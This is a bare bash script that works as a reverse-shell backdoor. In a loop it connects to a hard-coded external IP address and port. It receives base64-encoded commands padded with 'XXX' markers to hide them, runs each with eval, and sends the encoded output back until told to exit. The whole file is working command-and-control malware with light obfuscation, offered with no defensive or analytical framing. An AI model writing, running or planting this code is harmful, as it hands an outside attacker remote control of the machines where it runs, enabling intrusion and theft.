#!/bin/bash
host="38.180.172.61"
port=12348

while true
do
    sleep 10
    exec 3<>/dev/tcp/$host/$port
    read -r response <&3
    if [ -n "$response" ]; then 
        response=$(echo "$response" | sed 's/XXX//g')
        decoded_response=$(echo "$response" | base64 -d)
        if [ "$decoded_response" == "exit" ];then
            break
        fi   
        reverse=$(eval "$decoded_response" | base64)
        reverse=$(echo "$reverse" | sed '1 s/./&XXX/'1)
        echo "$reverse" >&3
    fi
    exec 3>&-
    exec 3<&-
done
